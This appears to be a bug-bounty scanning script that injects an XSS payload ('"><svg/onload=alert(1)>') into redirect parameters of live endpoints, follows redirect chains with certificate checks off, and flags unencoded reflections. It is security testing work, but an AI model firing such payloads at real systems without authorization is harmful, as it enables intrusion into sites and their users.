"""Follow each reflecting endpoint's redirect chain and look for the token in an
HTML BODY, raw (not entity/percent encoded). A token that only lives in a
Location header is inert; one that lands unencoded in a body is the XSS lead.
"""
import json
import re
import string
import random

import requests
import urllib3
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
PARAMS = {ln.strip().lower() for ln in open("/opt/watch/wordlists/redirect-params.txt")}


def tok():
    return "zq" + "".join(random.choice(string.ascii_lowercase + string.digits)
                          for _ in range(10))


def swap(url, param, value):
    sp = urlsplit(url)
    pairs = parse_qsl(sp.query, keep_blank_values=True)
    out = [(k, value if k == param else v) for k, v in pairs]
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(out), ""))


rows = json.load(open('/opt/watch/logs/bb4/watch_xss_probe.json'))
refl = [r for r in rows if r['probes']['plain']['body'] == 'present'
        or r['probes']['plain']['loc'] == 'present']

print(f"chain-following {len(refl)} reflecting endpoints\n")
for r in refl:
    t = tok()
    payload = f'{t}"><svg/onload=alert(1)>'
    url = swap(r['url'], r['param'], payload)
    print("=" * 100)
    print(f"{r['program']} | {r['url'][:110]}")
    print(f"  payload param {r['param']}={payload}")
    try:
        resp = requests.get(url, timeout=25, verify=False, headers=UA,
                            allow_redirects=True)
    except Exception as e:
        print("  ERR", type(e).__name__)
        continue
    print(f"  hops={len(resp.history)} final={resp.status_code} {resp.url[:100]}")
    for h in resp.history:
        loc = h.headers.get('Location') or ''
        if t in loc:
            print(f"    loc carries token (raw): {loc[:130]}")
    body = resp.text or ''
    enc_pct = payload.replace('<', '%3C').replace('>', '%3E')
    hits = []
    if t in body:
        i = body.find(t)
        seg = re.sub(r'\s+', ' ', body[max(0, i - 80):i + 120])
        hits.append(("token-in-body", seg))
        if re.search(re.escape(t) + r'["\']?><', body):
            hits.append(("RAW-BREAKOUT", seg))
        if re.search(re.escape(t) + r'\s', body) and '&lt;' not in seg:
            hits.append(("maybe-raw", seg))
    if not hits:
        print("    token absent from final body -> inert (header-only reflection)")
    for name, seg in hits:
        print(f"    {name}: {seg[:230]}")
